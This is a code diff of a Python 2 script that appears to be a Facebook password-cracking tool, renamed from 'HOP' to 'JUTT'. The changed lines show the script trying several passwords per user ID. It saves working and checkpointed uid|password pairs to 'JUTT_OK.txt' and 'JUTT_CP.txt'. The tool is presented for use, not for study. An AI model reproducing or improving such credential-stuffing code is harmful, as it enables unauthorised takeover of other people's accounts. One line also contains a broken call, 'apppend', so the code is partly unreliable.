@@ -831,7 +831,7 @@ def c_s():
     raw_input('\x1b[1;93m Press enter to back')
     choice_crack()
 
-def crack_b():
+def crack_c():
     global toket
     try:
         toket = open('login.txt', 'r').read()
@@ -989,13 +989,13 @@ def n_s():
             q = json.loads(data)
             if 'loc' in q:
                 print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
-                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
                 print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass1
-                cp = open('HOP_CP.txt', 'a')
+                cp = open('JUTT_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -1004,13 +1004,13 @@ def n_s():
                 q = json.loads(data)
                 if 'loc' in q:
                     print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
-                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
                     print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass2
-                    cp = open('HOP_CP.txt', 'a')
+                    cp = open('JUTT_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
@@ -1019,13 +1019,13 @@ def n_s():
                     q = json.loads(data)
                     if 'loc' in q:
                         print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
-                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
                         print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass3
-                        cp = open('HOP_CP.txt', 'a')
+                        cp = open('JUTT_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
@@ -1034,13 +1034,13 @@ def n_s():
                         q = json.loads(data)
                         if 'loc' in q:
                             print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
-                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
                             print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass4
-                            cp = open('HOP_CP.txt', 'a')
+                            cp = open('JUTT_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.apppend(uid + pass4)
@@ -1054,7 +1054,7 @@ def n_s():
     print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
     print 47 * '-'
     raw_input('\x1b[1;93m Press enter to back')
-    choice_crack()
+    name_crack()
 
 
 if __name__ == '__main__':
